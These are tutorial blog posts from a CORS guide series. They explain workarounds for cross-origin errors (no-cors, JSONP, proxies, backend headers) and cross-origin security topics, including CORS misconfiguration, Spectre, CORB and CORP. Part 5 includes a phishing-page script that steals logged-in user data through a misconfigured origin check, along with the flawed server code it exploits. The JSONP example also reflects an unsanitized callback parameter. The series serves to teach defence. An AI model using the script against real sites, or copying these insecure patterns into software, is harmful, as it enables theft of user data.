looked at fetching resources from a specification perspective. We also confirmed many of the statements made in the previous articles from the specification. I highly recommend that you take some time to scan the spec, at least to have some impression of many things, which will make it easier to find information later. In addition, you can also see some interesting parts of the specification, such as the caching problem mentioned at the end, which I actually encountered. If I had looked at the spec earlier, I would have been able to think of a solution faster when I encountered the problem. When looking at the spec, you can also see that many things are done for security considerations. Next, let’s take a look at the penultimate article in this series: CORS Complete Manual (5): Security Issues Across Sources.","link":"/2021/02/19/en/cors-guide-4/"},{"title":"CORS Complete Guide (Part 2): How to Solve CORS Issues?","text":"IntroductionIn the previous article CORS Complete Guide (Part 1): Why CORS Error Occurs?, we understood why the browser has a same-origin policy and that the blocked cross-origin request is actually the response, not the request. After clarifying some misconceptions and having a basic understanding of CORS, we can now talk about how to solve CORS issues. First of all, I want to let you know that the methods mentioned in this article are not complete solutions. In fact, cross-origin requests are divided into two types: simple requests and non-simple requests. The fact that “the blocked cross-origin request is actually the response, not the request” basically only applies to simple requests, and this article will only focus on “simple requests”. As for how to distinguish between simple and non-simple requests, and how to handle non-simple requests, these will be discussed in the next article. There are actually many ways to solve basic CORS errors. Let’s first introduce a few “palliative” methods: Turn off the browser’s security settings. Set the fetch mode to no-cors. Do not use AJAX to fetch data. After discussing these three methods, we will talk about the last and most correct method: “Add CORS header to the backend”. Solution 1: Turn off the browser’s security settingsAs mentioned repeatedly in the previous article, the blocked cross-origin request is due to the browser’s restrictions. Therefore, one of the ways to solve CORS issues is to simply turn off the browser’s security settings, which is simple, effective, and violent. As for how to turn it off, if you are using Chrome, you can refer to: Run Chrome browser without CORS. For other browsers, you need to search for relevant information yourself. After turning off the security mechanism, you can successfully get the response, and the browser will also display a prompt: The problem is solved, but why do I say that this is a palliative method? Because it only works on your computer, and there are still problems on other people’s computers. Some people may turn off this setting for convenience during development, so they will not encounter any CORS issues. However, I think this is not a good practice because you are not only turning off CORS, but also other security mechanisms. In short, I just want to introduce this solution to you, but I do not recommend using it. Solution 2: Set the fetch mode to no-corsThis is definitely one of the most common mistakes made by beginners. Please pay attention. If you are using fetch to fetch data, such as this (the origin of this webpage is http://localhost:8081, which is different from http://localhost:3000): fetch('http://localhost:3000').then(res => &#123; console.log('response', res) return res.text() &#125;).then(body => &#123; console.log('body', body) &#125;) You will see a prominent red message on the console: Access to fetch at ‘http://localhost:3000/‘ from origin ‘http://localhost:8081‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. The first half is familiar, and the second half may be a bit unfamiliar. But it doesn’t matter, we see the keyword: set the request&#39;s mode to &#39;no-cors&#39;. Oh, does this mean that we can ignore CORS in this way? Let’s try it out immediately: fetch('http://localhost:3000', &#123; mode: 'no-cors' &#125;).then(res => &#123; console.log('response', res) return res.text() &#125;).then(body => &#123; console.log('body', body) &#125;) After changing the code and running it again, there is no error message! The console is clean, but the value printed seems strange: The response status is 0, the body content is empty, and the type is something called opaque, which looks strange. But if we open the devtool and switch to the Network tab, we will find that the backend actually returns a response. Hmm, the browser clearly received the response, why is there no content in the program? Why is this happening? This is because mode: no-cors is completely different from what you think. When you pass in mode: no-cors, you are telling the browser: “I want to send a request to a URL without CORS headers, so please don’t give me an error.” Since this is the case, you will not see the error message No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource, because you expected this to happen. However, setting this mode does not mean that you will be able to get the response magically. In fact, it is the opposite. If you use mode: no-cors, you will definitely not get the response. Yes, you will definitely not get it, even if the backend adds the Access-Control-Allow-Origin header for you, you still won’t get the response. After setting this mode, it does not magically allow you to bypass restrictions and get things. On the contrary, this mode is telling the browser: “I want to send a request to a resource without CORS headers, I know I won’t get a response, so you absolutely should not give me a response.” Therefore, if you find that you have used mode: no-cors, there is a 99% chance that you have used it incorrectly and should not use it at all. If you use it, you may be confused because: You can see the response in the network tab. Your program does not generate any errors. But you still can’t get the response, it’s empty, all because of the no-cors mode. If you use it, you may be as confused as the people in this issue. Therefore, adding this only means that you will not get an error, but it does not break the cross-origin restriction, and you still cannot get the response. As for when to use this mode, I need to study it further. You can refer to: Trying to use fetch and pass in mode: no-cors What limitations apply to opaque responses? Solution 3: Do not use AJAX to get dataSince using AJAX will be blocked by the cross-origin request policy, if we can get data without using AJAX, then there will be no problem, right? As we mentioned in the previous article, some tags are not subject to the same-origin policy, such as img or script…yes, script! Generally, script is used to import code written by others, such as jQuery or other libraries. But in the era when the CORS specification was not yet complete, some people came up with the clever trick of using the script tag to pass data. I still think it’s amazing. Simply put, it works like this. We can import other people’s scripts using the script tag, right? Suppose the script we want to import looks like this: var data = &#123; username: 'huli' &#125;; After we import it, can’t we directly access the data variable, which contains the data we want to get across domains? The above example is relatively simple. Let’s take a slightly more complicated example. Suppose we want to pass a userId to the server and need to get the data of this userId. Then our server can write like this: var express = require('express'); var app = express(); // 事先準備好的資料 const users = &#123; 1: &#123; name: 'user1' &#125;, 2: &#123; name: 'user2' &#125;, 3: &#123; name: 'user3' &#125;, &#125; // 根據傳入的 id 回傳資料 app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; res.end(`var data = $&#123;JSON.stringify(users[userId])&#125;`); &#125;); app.listen(3000, function () &#123; console.log('Example app listening on port 3000!'); &#125;); If we visit http://localhost:3000/users/1, the response will be: var data = &#123;&quot;name&quot;:&quot;user1&quot;&#125;. Then, our frontend can write like this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"http://localhost:3000/users/1\">&lt;/script> &lt;script> console.log(data) &lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> Just import this script and print out the data, and we can see that we have successfully obtained the data! So the key point of this method is that the server generates data dynamically and outputs it in the form of JS. However, in practice, we do not know in advance whose data we need to get, but rather we get the corresponding id data after the user performs some actions. Therefore, this script will be dynamically added, like this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function getUser(userId) &#123; // 新增 script 元素 const script = document.createElement('script') // 加上 src script.src = 'http://localhost:3000/users/' + userId // 插入到 body 中 document.body.appendChild(script); // 印出資料 console.log(data) &#125; &lt;/script> &lt;/head> &lt;body> &lt;button onclick=\"getUser(1)\">user1&lt;/button> &lt;button onclick=\"getUser(2)\">user2&lt;/button> &lt;/body> &lt;/html> The front-end has two buttons, one for fetching user1’s data and the other for fetching user2’s data. After clicking the button, we dynamically generate a script and place it in the body. This way, when the script finishes loading, we can retrieve the data. However, if you execute the above code, you will get an Uncaught ReferenceError: data is not defined error. This is because loading the script takes time, and we cannot retrieve the data before it finishes loading. For asynchronous operations like this, the solution is always the same: add a callback. Instead of using a variable to store the data, it’s better to use a callback to pass the data. The backend can be changed to: app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; res.end(`setData($&#123;JSON.stringify(users[userId])&#125;)`); &#125;); The response you get will look like this: setData(&#123;\"name\":\"user1\"&#125;) Basically, we just changed the variable declaration to a function parameter. And this setData is the function you need to write on the front-end to receive the data: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function setData(data) &#123; console.log(data) &#125; function getUser(userId) &#123; const script = document.createElement('script') script.src = 'http://localhost:3000/users/' + userId document.body.appendChild(script); &#125; &lt;/script> &lt;/head> &lt;body> &lt;button onclick=\"getUser(1)\">user1&lt;/button> &lt;button onclick=\"getUser(2)\">user2&lt;/button> &lt;/body> &lt;/html> This way, when the script finishes loading, it will call the setData function and pass the data to it, and we can retrieve the data. Finally, we can make a small improvement by not hard-coding the function name, but allowing the client to pass in the desired name: app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; const callback = req.query.callback; res.end(`$&#123;callback&#125;($&#123;JSON.stringify(users[userId])&#125;)`); &#125;); And the front-end can pass a query string to specify the callback function name: function setUser(data) &#123; console.log(data) &#125; function getUser(userId) &#123; const script = document.createElement('script') script.src = 'http://localhost:3000/users/' + userId + '?callback=setUser'; document.body.appendChild(script); &#125; To summarize this method, it uses the fact that the script tag does not block cross-origin requests, allowing the server to dynamically generate the file content and pass JSON-formatted data by calling a JavaScript function. This method is called JSONP, which stands for JSON with Padding (padding refers to the function name we added in front). It was quite common in the early days when the CORS specification was not yet complete, cleverly bypassing the browser’s security restrictions. However, its disadvantage is that since you can only call it using a script tag, you can only use the GET method, and other methods like POST, PATCH, and DELETE cannot be used. When using $.ajax provided by jQuery, you may have noticed the JSONP parameter, which made me think they were the same thing, but jQuery just wrapped them up. The principle of JSONP is to pass data using a script tag to bypass the CORS policy, and you need server cooperation to use it (because what it returns is actually a piece of JavaScript, not just data). Some APIs still support JSONP, such as the Twitch API. HalftimeBy now, you should have tried most of the front-end solutions, and you may have noticed that the three solutions mentioned above: Disabling the browser’s security settings Setting the fetch mode to no-cors Not using AJAX to retrieve data cannot really solve the problem. The first one only works for your own browser, the second one is just self-deception, and you still cannot get the response, and the third one requires special support from the server and has its limitations. That’s why I said in the previous article: “In most cases, CORS is not a front-end problem, and pure front-end cannot solve it.” The browser blocks things for security reasons, so you have to let the browser know: “This is actually safe,” and then it will allow it. For example, if you send a cross-origin request to google.com, the browser will block it for security reasons. Who can decide not to block this request? It’s not the front-end, because the front-end is the one sending the request. Therefore, the answer is naturally the backend, which is google.com. As long as google.com tells the browser: “Hey, I trust this origin, it won’t do anything bad, give him my response!” the browser will comply. It’s like if you work in a restaurant and hear a customer say, “I know the boss,” would you immediately believe him? No, because anyone can say they know the boss, but you can’t judge whether it’s true or not. To judge the truth, you can only ask the boss. If the boss says, “Yes, I really know him,” then it’s true. So the one who has the decision-making power is not the customer, but the boss. Sending cross-origin requests is the same. Every origin will say that it has permissions, but you can’t ask those who send the requests, you have to ask the receiving end. Ask if you are willing to give this origin permission, and if you are willing, then allow it. Therefore, none of the three solutions mentioned above can really solve the problem. So how do you tell the browser, “I agree”? The method may be much simpler than you think - just add a header! The real solution: Set CORS header on the backendDo you remember the error that occurred when you used fetch at the beginning? Access to fetch at ‘http://localhost:3000/‘ from origin ‘http://localhost:8081‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. This is the part that says: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. As mentioned earlier, the backend is the one with the authority to tell the browser, “I allow this origin to access my resources across domains,” and the way to tell the browser is to add a header to the response. The name of this header is Access-Control-Allow-Origin, and the content is the origin you want to allow, for example: Access-Control-Allow-Origin: http://localhost:8081, which allows cross-origin requests from http://localhost:8081. What if you want to allow multiple origins? Sorry, you can’t put multiple origins in the header. You can only put one, or you can choose to put *, which means allowing any origin. If you want to target multiple origins, the server needs to do some extra processing. Let’s first look at the case of putting *: var express = require('express'); var app = express(); app.get('/', function (req, res) &#123; res.set('Access-Control-Allow-Origin', '*'); res.end('hello world'); &#125;); app.listen(3000, function () &#123; console.log('Example app listening on port 3000!'); &#125;); This tells the browser, “Any origin can get my response, you don’t need to block it.” So when the front-end uses AJAX to send a request, it can get the response without any errors. There is a common mistake here, which is that some people think that the Access-Control-Allow-Origin header is something that the front-end needs to add when sending a request. No, this is completely wrong. Adding this in the front-end is completely useless because this header only exists in the response and needs to be added by the backend. Adding it in the front-end is the same as not adding it at all. So if you have added this in the front-end, please remove it. Once again, CORS issues cannot be solved purely by the front-end. Basically, the backend needs to be involved. If you only want to allow specific origins, just pass in the origin you want to allow: app.get('/', function (req, res) &#123; res.set('Access-Control-Allow-Origin', 'http://localhost:8081'); res.end('hello world'); &#125;); It’s that simple. Just add a header to tell the browser, “I agree that this origin can get my response,” and that’s it. This is the fundamental solution to cross-origin requests. If you have a cooperative relationship with the resource you want to access, usually just ask them to set this header. For example, if you encounter a CORS issue when connecting to the company’s backend API, just ask the backend engineer to add this header for you. Don’t try to solve it yourself because this is not a problem that the front-end should solve. It is a problem that the backend should solve, but you need to help them and tell them how to solve it. I emphasized one thing above, which is “you have a cooperative relationship with the resource you want to access,” but sometimes you may want to get some data in the front-end that you have no cooperative relationship with, such as calling someone else’s non-public API or fetching content from google.com, and these resources will never give you the Access-Control-Allow-Origin header. What to do then? Let’s welcome the proxy server! Use a proxy serverIn these articles, I keep reminding everyone that the same-origin policy and other restrictions are only “browser restrictions.” Once you leave the browser, there are no restrictions, and that’s where the proxy server comes in. The translation of the proxy server is a proxy server. The meaning of this term may be slightly different in different situations, but the general direction is the same. Originally, you were sending data from A to B, but with a proxy, you send it from A to P (proxy server), then from P to B, and then back again. In the middle, P plays the role of “proxy.” This is like a celebrity and their agent. The agent is responsible for external work and contacts, and then informs the celebrity. If the celebrity wants to work with someone, they also ask the agent, who then asks and tells the celebrity. So the agent is actually the “proxy” for the celebrity. So how can we apply this concept to CORS-related issues? If you want to access data from website A, but it does not provide the Access-Control-Allow-Origin header, you can write your own server to retrieve the data from the backend of website A and then return the data to your own frontend. Because you can control your own backend, you can add any header you want and retrieve any data you want. The numbers in the image represent the following process: The browser sends a request to the proxy, requesting data from huli.tw. The proxy server retrieves the data from huli.tw (backend, not browser, so there is no cross-origin restriction). huli.tw returns the data to the proxy (same as above, no cross-origin restriction). The proxy returns the data to the browser, adding CORS headers (so the frontend is not blocked). You may have heard of CORS Anywhere, which starts with the following statement: CORS Anywhere is a NodeJS proxy which adds CORS headers to the proxied request. It is a proxy server that adds CORS headers to the resources you want to access. Or, if you are using a plugin on Chrome to solve CORS issues, the principle behind it is simply to add the Access-Control-Allow-Origin header to the response using the plugin. Therefore, there is no magic to solving CORS issues, whether you use a plugin or a proxy server, the principle behind it is the same, which is the Access-Control-Allow-Origin header. However, when it comes to the proxy approach, some people may have a question: Didn’t you say at the beginning that there would be security issues if you could access data from any website? What about the proxy server? Why is there no such restriction when using a proxy? Let’s take a look at this comparison chart. The top part shows the process of using a proxy, while the bottom part shows the process without using one: We first look at the bottom part. If you don’t use a proxy, there will be security issues as mentioned earlier, and the website can access data from your localhost or other websites, so the browser blocks it. Next, let’s look at the top part. It is important to note that if you use a proxy, who is communicating with localhost:3000? It is the proxy server, so the webpage is not retrieving data from “local localhost:3000”, but from “proxy server’s localhost:3000”. Therefore, there is no security issue for your computer (but there may be for the proxy server). SummaryIn this article, we have looked at many different solutions. The most common one you should use is “ask the backend to add CORS headers”, because this is usually the most correct solution. But if you don’t have control over the backend, such as when you want to retrieve data from an unfamiliar source, you may want to set up a proxy server yourself or find an existing one to add CORS headers for you. Many people used to use CORS Anywhere, but starting from February 2021, this service will be subject to many restrictions due to various factors, because it was not originally intended to be used as a proxy service, but as a demo for the CORS anywhere project. For more information, please refer to: PSA: Public demo server (cors-anywhere.herokuapp.com) will be very limited by January 2021, 31st #301 If the backend API only provides JSONP, you can also use JSONP. If you find CORS annoying when testing things on your own computer, you can install an extension to solve the problem, but be aware that this only works on your own computer and will not work on another computer. There is no one solution that is always right or wrong, as different situations may require different approaches. However, I say “asking the backend to add CORS headers is usually the most correct solution” because most people who encounter cross-origin request issues may be at work. If both the frontend and backend have experience, adding a header will solve the problem, but if both sides are inexperienced, they may take a detour and have the frontend set up a proxy server, which is the consequence of not being familiar with this topic. Or some people may start to study how to “solve cross-origin problems through pure front-end”, and after a big circle, they find that neither this nor that works, and even the seemingly most promising mode: no-cors doesn’t work. After reading this article, you will understand that this is not something that the front-end should solve, so you naturally cannot solve it through pure front-end. Can CORS issues be completely resolved after reading this article? Not necessarily. This article only deals with the “simplest situation”. There are still several situations that we have not mentioned, such as the most common: Non-simple requests (using other HTTP methods and custom headers) Sending cookies (how to make cross-origin requests also support cookies) These will be explained in the next article: CORS Complete Manual (3): CORS Details.","link":"/2021/02/19/en/cors-guide-2/"},{"title":"CORS Complete Guide (5): Security Issues of Cross-Origin","text":"IntroductionIn the previous articles, we learned that the CORS protocol is essentially a security protocol. In addition to CORS, there are actually a series of things related to cross-origin, such as: CORB (Cross-Origin Read Blocking) CORP (Cross-Origin Resource Policy) COEP (Cross-Origin-Embedder-Policy) COOP (Cross-Origin-Opener-Policy) Doesn’t just seeing this series of similar terms make you dizzy? Yes, me too. In the process of organizing this information, I found that the security issues related to cross-origin are more complicated than I thought, but after spending some time organizing them, I found that there is still a logical sequence to follow. Therefore, this article will explain why these things appear in a context that I think should be easier to understand. In addition to the various COXX things mentioned above, there are other cross-origin related security issues that I want to mention in this article. Before we continue, I would like to remind everyone that this article is about “security issues of cross-origin”, not just “security issues of CORS”. The things protected by the CORS protocol and their content have been introduced before. What this article is going to talk about is actually somewhat deviating from the main title “CORS” complete guide, because this is not very related to the CORS protocol, but rather raises the level again and talks about “cross-origin” itself. So when you read the following things, don’t confuse them with CORS. Except for the first thing to be discussed later, the others are not very related to CORS. CORS misconfigurationIf you still remember, I mentioned earlier that if a cross-origin request wants to carry a cookie, Access-Control-Allow-Origin cannot be *, but must specify a single origin, otherwise the browser will not pass it. But the reality is that we cannot have only one origin. We may have many origins, such as buy.example.com, social.example.com, note.example.com, all of which need to access api.example.com. At this time, we cannot hard-code the origin in the response header, but must adjust it dynamically. Let’s talk about the worst way first, like this: app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' res.headers['Access-Control-Allow-Origin'] = req.headers['Origin'] &#125;) For convenience, the origin in the request header is directly mapped. By doing so, it actually means that any origin can pass the CORS check. What problems will this cause? The problem is huge. Assuming that I make a phishing website today, the URL is http://fake-example.com, and I try to make the user click on this website, and the phishing website writes a script: // 用 api 去拿使用者資料，並且帶上 cookie fetch('http://api.example.com/me', &#123; credentials: 'include' &#125;) .then(res => res.text()) .then(res => &#123; // 成功拿到使用者資料，我可以傳送到我自己的 server console.log(res) // 把使用者導回真正的網站 window.location = 'http://example.com' &#125;) I use fetch to request http://api.example.com/me to get data and carry cookies. Then, because the server will always respond with the correct header, the CORS check will pass and I will get the data. Therefore, this attack will be successful as long as the user clicks on the phishing website and is logged in to example.com. As for the scope of influence, it depends on the website’s api. The most basic thing is to only get user data, and more serious things may be able to get user tokens (if there is this api). There are several things to note about this attack: This is not XSS, because I did not execute code on example.com, but executed it on my own phishing website http://fake-example.com. This is somewhat like CSRF, but the website usually does not add CSRF token protection to GET APIs, so it can pass. If SameSite cookie is set, the attack will fail because the cookie cannot be carried. Therefore, there are several prerequisites for this attack to succeed: The CORS header is given to the wrong origin. The website uses cookies for identity authentication and does not set SameSite. The user actively clicks on the phishing website and is logged in. Regarding the first point, no one may write like me above, directly using the origin in the request header. The more likely approach is like this: app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' const origin = req.headers['Origin'] // 偵測是不是 example.com 結尾 if (/example\\.com$/.test(origin)) &#123; res.headers['Access-Control-Allow-Origin'] = origin &#125; &#125;) In this way, the origins below can all pass: example.com buy.example.com social.example.com However, writing like this is problematic because it can also pass: fakeexample.com This type of vulnerability is caused by incorrect CORS settings, so it is called CORS misconfiguration. The solution is not to use RegExp for judgment, but to prepare a list in advance. Only those that appear in the list pass, otherwise they all fail. In this way, it can be ensured that there are no vulnerabilities in the judgment, and remember to add the SameSite attribute to the cookie. const allowOrigins = [ 'example.com', 'buy.example.com', 'social.example.com' ] app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' const origin = req.headers['Origin'] if (allowOrigins.includes(origin)) &#123; res.headers['Access-Control-Allow-Origin'] = origin &#125; &#125;) For more information, please refer to: 3 Ways to Exploit Misconfigured Cross-Origin Resource Sharing (CORS) JetBrains IDE Remote Code Execution and Local File Disclosure AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle Bypass Same-origin Policy?In addition to CORS, Same-origin policy actually appears in various places in the browser, such as window.open and iframe. When you use window.open to open a webpage, the return value will be the window of the new webpage (more precisely, it is WindowProxy, you can refer to MDN: Window.open()), but only in the same origin. Accessible, if it is not the same origin, only a small part of things can be accessed. Assuming that I am now in a.example.com, and then wrote this script: var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; console.log(win) &#125;, 2000) Use window.open to open b.example.com, and then go to access the window of b.example.com after the page is loaded. After execution, you will see an error message in the console: Because a.example.com and b.example.com are cross-origin, the window cannot be accessed. This specification is actually very reasonable, because if you can access the window, you can actually do a lot of things, so it is limited to being able to get the window only under the same origin. However, the statement “cannot access the window” is not very accurate, because even if it is cross-origin, there are still some operations that are allowed, such as: var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; // 變更開啟的 window 的位置 win.location = 'https://google.com' setTimeout(() => &#123; // 關閉視窗 win.close() &#125;, 2000) &#125;, 2000) Can change the location of the opened window and close the opened window. On the other hand, as the opened window (b.example.com), you can also use window.opener to get the window of the webpage (a.example.com) that opened it, but only some operations are allowed. However, if these two websites are under the same subdomain and you have control over both websites, you can make their origins the same by changing document.domain! In a.example.com, do this: // 新增這個，把 domain 設為 example.com document.domain = 'example.com' var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; console.log(win.secret) // 12345 &#125;, 2000) In b.example.com, you also need to do the same thing: document.domain = 'example.com' window.secret = 12345 Then you will magically find that you can now get the window of b.example.com! And almost everything can be done. For more detailed introduction, please refer to MDN: Document.domain. This may be due to historical factors, but it may be removed in the future due to security issues. You can refer to the related spec: 7.5.2 Relaxing the same-origin restriction Let’s get to the point: What are the other COXXs?The first two are just small potatoes and not the main focus of this article. What I really want to share with you are: CORB (Cross-Origin Read Blocking) CORP (Cross-Origin Resource Policy) COEP (Cross-Origin-Embedder-Policy) COOP (Cross-Origin-Opener-Policy) I will explain these things in a way that I think is easier to understand, as they can be easily confused if not explained properly. Serious Security Vulnerabilities: Meltdown and SpectreOn January 3, 2018, Google’s Project Zero released an article titled Reading privileged memory with a side-channel, which described three attacks on CPU data cache: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) The first two are called Spectre, and the third is called Meltdown. This was a big deal at the time because the problem was with the CPU and was not an easy fix. The disclosure of this vulnerability had a significant impact on the operation of browsers (or at least accelerated the evolution of browsers), especially since Spectre can be used to attack browsers, which of course also affects this series of topics: Cross-Origin Resource Sharing. Therefore, it is necessary to understand what Spectre is doing. If you want to fully understand this attack, you need a lot of background knowledge, but this is not the main topic of this article. Therefore, I will explain Spectre in a very simplified model below. If you want to fully understand it, you can refer to the link above. Super Simplified Explanation of Spectre AttackAgain, this is a simplified version for easy understanding, and there are some differences from the original attack, but the core concept should be similar. Assume that there is a piece of code (in C language) that looks like this: uint8_t arr1[16] = &#123;1, 2, 3&#125;; uint8_t arr2[256]; unsigned int array1_size = 16; void run(size_t x) &#123; if(x &lt; array1_size) &#123; uint8_t y = array2[array1[x]]; &#125; &#125; size_t x = 1; run(x); I declared two arrays, both of type uint8_t, so each element of the array will be 1 byte (8 bits) in size. The length of arr1 is 16, and the length of arr2 is 256. Next, I have a function called run, which takes a number x, and checks if x is less than array1_size. If it is, I first take the value of array1[x], then use it as an index to access array2, and assign the obtained value to y. For example, if run(1) is executed, the following code will be executed: uint8_t y &#x3D; array2[array1[1]]; And the value of array1[1] is 2, so it is y = array2[2]. This code looks fine, and I have done the length check of the array, so there will be no Out-of-Bounds (OOB) situation, only when x is less than array1_size will it continue to execute. However, this is just what you see. When the CPU executes the code, there is a mechanism called branch prediction. In order to improve the efficiency of code execution, if the CPU encounters an if condition during execution, it will first predict whether the result is true or false. If the predicted result is true, it will first execute the code inside the if statement and calculate the result. All of the above are just “predictions”. After the actual if condition is executed, if the result is the same as the predicted result, everything is fine. If it is different, the result just calculated will be discarded. This mechanism is called speculative execution. Because the CPU discards the result, we cannot get the result of speculative execution unless the CPU leaves some clues. And this is the main reason why the Spectre attack is successful, because there are indeed clues left. To improve execution efficiency, some results are placed in the CPU cache during speculative execution to improve the efficiency of subsequent data reads. Assuming there are three things, ABC, and one is in the CPU cache while the other two are not, how do we know which one is in the cache? The answer is by accessing these three things and measuring the time it takes to access them. Since the thing in the CPU cache is always accessed faster, if it takes 10ms to read A, 10ms to read B, and only 1ms to read C, we know that C must be in the CPU cache. This type of attack that obtains information through other clues is called a side-channel attack, which obtains information from other channels. Using the timing-attack method mentioned above, we can now look back at the previous code: uint8_t arr1[16] = &#123;1, 2, 3&#125;; uint8_t arr2[256]; unsigned int array1_size = 16; void run(size_t x) &#123; if(x &lt; array1_size) &#123; uint8_t y = array2[array1[x]]; &#125; &#125; size_t x = 1; run(x); Suppose I run run(10) many times, and the CPU predicts that I will satisfy the if condition next time and execute the code inside it. At this point, I suddenly set x to 100 and run run(100). The code inside the if statement will be predicted to execute: uint8_t y &#x3D; array2[array1[100]]; Suppose the value of array1[100] is 38, then y = array2[38], so array2[38] will be placed in the CPU cache, improving the efficiency of subsequent loading. Then, when actually executing the if condition, it is found that the condition is not met, so the result obtained is discarded, and nothing happens, and the function is executed. Then, according to the timing attack mentioned above, we read each element of array2 and calculate the time, and find that the reading time of array2[38] is the shortest. At this point, we know one thing: The content of array1[100] is 38. You may ask, “What can you do with this?” There are many things you can do. The length of array1 is only 16, so the value I read is not the thing in array1 itself, but the memory of other parts, which is the place I should not access. And as long as I keep copying this pattern, I can read all the data from other places. If this attack is placed on a browser, I can read data from other websites in the same process. In other words, if there is content from other websites in the same process, I can read that content! This is the Spectre attack, which uses some mechanisms of the CPU to perform side-channel attacks and read data that should not be read, causing security issues. So, to put it simply, in a browser, Spectre can give you the opportunity to read data from other websites. This is the explanation of Spectre. The above simplifies many details, and I do not fully understand those details. If you want to know more, you can refer to the following: Reading privileged memory with a side-channel 解读 Meltdown &amp; Spectre CPU 漏洞 浅谈处理器级Spectre Attack及Poc分析 [閒聊] Spectre &amp; Meltdown漏洞概論(翻譯) Spectre漏洞示例代码注释 Google update: Meltdown&#x2F;Spectre Mitigating Spectre with Site Isolation in Chrome All those COXX things have the same purpose, which is to prevent a website from being able to read data from other websites. As long as the malicious website and the target website are not in the same process, this type of attack will fail. From this perspective, let’s take a look at various related mechanisms. CORB (Cross-Origin Read Blocking)A month after Google publicly announced the Spectre attack, in February 2018, they published a blog post explaining what Chrome did to prevent this type of attack: Meltdown&#x2F;Spectre. The Cross-Site Document Blocking mentioned in the article is the predecessor of CORB. According to the Chrome Platform Status, it was officially enabled by default in Chrome for desktop release 67, which was around May 2018. At that time, it was also merged into the fetch spec and became part of the specification (CORB: blocking of nosniff and 206 responses). As mentioned earlier, Spectre can read data under the same process, so one way to defend against it is not to let data from other websites appear under the same process. A website has many ways to bring in cross-origin resources, such as fetch or xhr, but these two have been controlled by CORS, and the response obtained should be stored in the network-related process rather than the website’s own process, so even with Spectre, it cannot be read. However, using tags such as &lt;img&gt; or &lt;script&gt; can easily load resources from other websites. For example: &lt;img src=&quot;https://bank.com/secret.json&quot;&gt;, assuming that secret.json is confidential data, we can “load” this confidential data. You may wonder, “What’s the point of doing this? It’s not an image, and I can’t even read it with JS.” That’s right, this is not an image, but in terms of Chrome’s operation mechanism, Chrome does not know that it is not an image before downloading it (it may have a file extension of .json but is actually an image), so it will download it first. After downloading, it will put the result into the render process. At this time, it will know that this is not an image and then trigger a loading error. It seems that there is no problem, but don’t forget that Spectre has opened a new window, which is “I have the opportunity to read data in the same process.” Therefore, just “putting the result into the render process” is not enough, because through Spectre attacks, attackers can still get data stored in memory. Therefore, the purpose of the CORB mechanism is: If the data type you want to read is completely unreasonable, then I don’t need to put the result into the render process at all, I can just discard it! Continuing with the example above, if the MIME type of that json file is application&#x2F;json, it means that it cannot be an image at all, so it cannot be placed in the img tag. This is what I mean by “the data type you want to read is completely unreasonable.” CORB mainly protects three types of data: HTML, XML, and JSON. How does the browser know that it is one of these three types? Why not judge from the content type in the response header? Unfortunately, it is not possible. The reason is that the content type of many websites is set incorrectly. It may be a JavaScript file but set as text/html, which will be blocked by CORB and the website will break. Therefore, Chrome will detect (sniffing) the file type based on the content and then decide whether to apply CORB. But this may also cause misjudgments, so if the content type provided by your server is confirmed to be correct, you can pass a response header X-Content-Type-Options: nosniff, and Chrome will directly use the content type you provided instead of detecting it by itself. In summary, CORB is a mechanism that is already enabled by default in Chrome, which automatically blocks unreasonable cross-origin resource loading, such as using &lt;img&gt; to load json or using &lt;script&gt; to load HTML, etc. In addition to Chrome, Safari and Firefox have not yet implemented this mechanism. For more detailed explanations, please refer to: Cross-Origin Read Blocking for Web Developers Cross-Origin Read Blocking (CORB) CORP (Cross-Origin Resource Policy)CORB is a built-in mechanism in browsers that automatically protects HTML, XML, and JSON from being loaded into a cross-origin render process, preventing Spectre attacks. But what about other resources? If other types of resources, such as some photos and videos, are also confidential data, can I protect them? This is where the CORP HTTP response header comes in. CORP, formerly known as From-Origin, is described in Cross-Origin-Resource-Policy (was: From-Origin) #687: Cross-Origin Read Blocking (CORB) automatically protects against Spectre attacks that load cross-origin, cross-type HTML, XML, and JSON resources, and is based on the browser’s ability to distinguish resource types. We think CORB is a good idea. From-Origin would offer servers an opt-in protection beyond CORB. If you know which resources to protect, you can use the CORP header to specify which sources can load these resources. There are three types of CORP content: Cross-Origin-Resource-Policy: same-site Cross-Origin-Resource-Policy: same-origin Cross-Origin-Resource-Policy: cross-origin The third type is similar to not setting it (but there is still a difference, which will be explained later), meaning that all cross-origin sources can load resources. Let’s see what happens after setting this up! First, we use express to start a simple server, add the CORP header, and put a picture with the URL http://b.example.com/logo.jpg: app.use((req, res, next) => &#123; res.header('Cross-Origin-Resource-Policy', 'same-origin') next() &#125;) app.use(express.static('public')); Then, we import this picture at http://a.example.com: &lt;img src=\"http://b.example.com/logo.jpg\" /> After refreshing and opening the console, you will see an error message that the picture cannot be loaded, and opening the network tab will explain the reason in detail: If the header is changed to same-site or cross-origin, the picture can be loaded correctly. So this header is actually the “CORS for resources”. The original CORS is 